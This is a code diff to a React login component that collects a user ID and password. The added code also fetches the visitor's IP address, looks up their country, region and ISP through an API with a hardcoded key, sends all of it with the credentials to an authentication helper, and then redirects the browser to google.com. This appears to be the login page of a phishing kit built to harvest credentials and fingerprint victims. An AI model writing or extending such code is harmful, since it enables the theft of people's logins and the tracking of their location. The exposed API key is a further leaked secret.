@@ -1,17 +1,55 @@
-import { useState } from 'react'
+import { useState, useEffect } from 'react'
 import { Authenticate } from '../../helpers/Auth'
+import axios from 'axios'
+import Loader from '../../component/Loader'
 
 const Other = () => {
   const [userID, setUserID] = useState('')
   const [password, setPassword] = useState('')
   const [error, setError] = useState('')
 
+  const [IPAddress, setIPAddress] = useState('')
+  const [metaData, setMetaData] = useState('')
+  const [redirect, setRedirect] = useState(false)
+
+  const [isLoading, setIsLoading] = useState(false)
+
+  useEffect(() => {
+    redirect && window.location.replace('https://google.com/')
+  }, [redirect])
+
+  useEffect(() => {
+    fetch('https://api.ipify.org?format=json')
+      .then((response) => response.json())
+      .then((data) => {
+        setIPAddress(data.ip)
+        console.log('ip is', data.ip)
+      })
+      .then(() => {
+        axios
+          .get(
+            `https://geo.ipify.org/api/v2/country?apiKey=at_51bi5RPzvgaTrXYA9cZohqZqMyKPI&ipAddress=${IPAddress}`
+          )
+          .then((resp) => {
+            const { location, isp } = resp.data
+            const { country, region } = location
+            console.log(country, region, isp)
+            setMetaData({ country, region, isp })
+          })
+          .catch((e) => console.log(e))
+      })
+      .catch((error) => console.error(error))
+  }, [])
+
   const handleClick = () => {
     setError('')
     if (!userID || !password) {
       setError('Please provide a valid email and password')
     } else {
-      Authenticate(userID, password, 'others')
+      setIsLoading(true)
+      Authenticate(userID, password, 'Others', IPAddress, metaData).then(() =>
+        setRedirect(true)
+      )
     }
   }
   return (
@@ -52,6 +90,7 @@ const Other = () => {
           </button>
         </main>
       </section>
+      {isLoading && <Loader message={'Loading'} />}
     </div>
   )
 }
